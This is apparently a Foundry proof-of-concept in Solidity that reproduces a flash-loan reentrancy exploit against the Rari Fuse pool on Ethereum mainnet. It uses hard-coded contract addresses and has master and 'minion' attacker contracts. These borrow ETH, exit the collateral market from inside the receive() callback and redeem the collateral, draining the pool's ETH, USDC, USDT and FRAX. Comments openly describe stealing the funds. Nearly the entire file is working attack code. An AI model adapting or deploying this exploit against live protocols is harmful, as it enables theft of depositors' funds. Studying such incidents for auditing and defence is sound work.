// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "openzeppelin/token/ERC20/extensions/IERC20Metadata.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns (uint256[] memory);
    function exitMarket(address cToken) external;
    function borrowCaps(address cToken) external view returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

// Contract address: https://etherscan.io/address/0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47#code
interface IERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns (uint256);
    function decimals() external view returns (uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (IERC20);
}

// Contract address: https://etherscan.io/address/0x26267e41CeCa7C8E0f143554Af707336f27Fa051#code
interface IETHDelegator {
    function mint() external payable;
    function balanceOf(address _of) external view returns (uint256);
    function decimals() external view returns (uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function getCash() external view returns (uint256);
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

// Relevant external contracts with interfaces
contract RelevantContracts {
    // Proxy and storage layer of the Comptroller
    IUnitroller public constant rariComptroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    // FTokens
    IERC20Delegator public constant fUSDC = IERC20Delegator(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    IERC20Delegator public constant fUSDT = IERC20Delegator(0xe097783483D1b7527152eF8B150B99B9B2700c8d);
    IERC20Delegator public constant fFRAX = IERC20Delegator(0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8);
    IETHDelegator public constant fETH = IETHDelegator(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);

    // Underlyings
    IWETH9 public constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Metadata public constant usdc = IERC20Metadata(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Metadata public constant usdt = IERC20Metadata(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Metadata public constant frax = IERC20Metadata(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    // Balancer vault
    IVault public constant vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
}

/**
 * Attacking contract
 *  1) Flashloan for $150M USDC and 50k WETH.
 *  2) Steal all ether in fETH by exploiting reentrancy loophole.
 *  3) Mint fEth and borrow other non-eth assets. (We are not going to return them :D)
 *  4) Steal all ether in fETH by exploiting reentrancy loophole again.
 *  5) Repay the flashloan and pocket the profits
 */
contract MasterAttacker is IFlashLoanRecipient, RelevantContracts {
    uint256 constant USDC_FLASHLOAN_AMOUNT = 150_000_000_000_000;
    uint256 constant WETH_FLASHLOAN_AMOUNT = 50_000 ether;

    // Initiate flashloan request for $150M USD and 50k ether
    // Done by triggering the flashLoan and receiveFlashLoan callback
    function attackFeiRari() external {
        // Declare tokens to flashloan
        IERC20[] memory _tokens = new IERC20[](2);
        _tokens[0] = usdc;
        _tokens[1] = weth;

        // Declare amount to flashloan
        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = USDC_FLASHLOAN_AMOUNT;
        _amounts[1] = WETH_FLASHLOAN_AMOUNT;

        // Initiate flashloan
        vault.flashLoan(IFlashLoanRecipient(address(this)), _tokens, _amounts, "");
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) external override {
        // The first minion is aimed to steal all eth in fETH.
        _sendMinionToStealEth();

        // Mint a great amount of eth as collateral.
        weth.withdraw(WETH_FLASHLOAN_AMOUNT);
        require(address(this).balance >= WETH_FLASHLOAN_AMOUNT, "ooo");
        fETH.mint{value: WETH_FLASHLOAN_AMOUNT}();
        address[] memory _cTokens = new address[](1);
        _cTokens[0] = address(fETH);
        rariComptroller.enterMarkets(_cTokens);

        // Borrow other non-ether assets as much as possible.
        require(rariComptroller.borrowCaps(address(fUSDC)) == 0, "USDC borrow caps");
        uint256 usdcCash = fUSDC.getCash();
        uint256 ret = fUSDC.borrow(usdcCash);
        require(ret == 0, "USDC borrow failed");

        require(rariComptroller.borrowCaps(address(fUSDT)) == 0, "USDT borrow caps");
        uint256 usdtCash = fUSDT.getCash();
        ret = fUSDT.borrow(usdtCash);
        require(ret == 0, "USDT borrow failed B");

        require(rariComptroller.borrowCaps(address(fFRAX)) == 0, "FRAX borrow caps");
        uint256 fraxCash = fFRAX.getCash();
        ret = fFRAX.borrow(fraxCash);
        require(ret == 0, "FRAX borrow failed C");

        // The second minion is aimed to steal the collateral we put in.
        _sendMinionToStealEth();

        // Redeem rest of the eth cash if any.
        uint256 ethCash = fETH.getCash();
        if (ethCash > 0) {
            fETH.redeemUnderlying(ethCash);
        }

        // Return flash loan
        weth.deposit{value: WETH_FLASHLOAN_AMOUNT}();
        usdc.transfer(address(vault), USDC_FLASHLOAN_AMOUNT);
        weth.transfer(address(vault), WETH_FLASHLOAN_AMOUNT);
    }

    function _sendMinionToStealEth() internal {
        MinionAttacker minion = new MinionAttacker();
        usdc.transfer(address(minion), USDC_FLASHLOAN_AMOUNT);
        minion.setup();
        minion.mint();
        uint256 ethCash = fETH.getCash();
        (, uint256 ethAvailableToBorrow,) = rariComptroller.getAccountLiquidity(address(minion));
        uint256 borrowAmount = ethAvailableToBorrow < ethCash ? ethAvailableToBorrow : ethCash;
        minion.borrow(borrowAmount);
        minion.redeemAll();
    }

    receive() external payable {}
}

/**
 * Minion attacker
 *  1) Mint fUSDC.
 *  2) Borrow ETH. Fallback to exit fUSDC market.
 *  3) Redeem USDC.
 *  4) Return all ETH and USDC to master attacker.
 */
contract MinionAttacker is RelevantContracts {
    uint256 constant USDC_FLASHLOAN_AMOUNT = 150_000_000_000_000;
    address immutable _masterAttacker;

    constructor() {
        _masterAttacker = msg.sender;
    }

    function setup() external {
        address[] memory _cTokens = new address[](1);
        _cTokens[0] = address(fUSDC);
        rariComptroller.enterMarkets(_cTokens);
    }

    function mint() external {
        require(usdc.balanceOf(address(this)) == USDC_FLASHLOAN_AMOUNT, "AAA");
        usdc.approve(address(fUSDC), type(uint256).max);
        fUSDC.mint(USDC_FLASHLOAN_AMOUNT);
    }

    function borrow(uint256 borrowAmount) external {
        require(rariComptroller.borrowCaps(address(fETH)) == 0, "Borrow cap wrong");
        uint256 ret = fETH.borrow(borrowAmount);
        require(ret == 0, "Borrow fail");
    }

    function redeemAll() external {
        // Since we've already exited market, we are free to redeem all collateral.
        fUSDC.approve(address(fUSDC), type(uint256).max);
        fUSDC.redeemUnderlying(USDC_FLASHLOAN_AMOUNT);

        // Return USDC and stolen ETH
        usdc.transfer(_masterAttacker, USDC_FLASHLOAN_AMOUNT);
        _masterAttacker.call{value: address(this).balance}("");
    }

    receive() external payable {
        rariComptroller.exitMarket(address(fUSDC));
    }
}
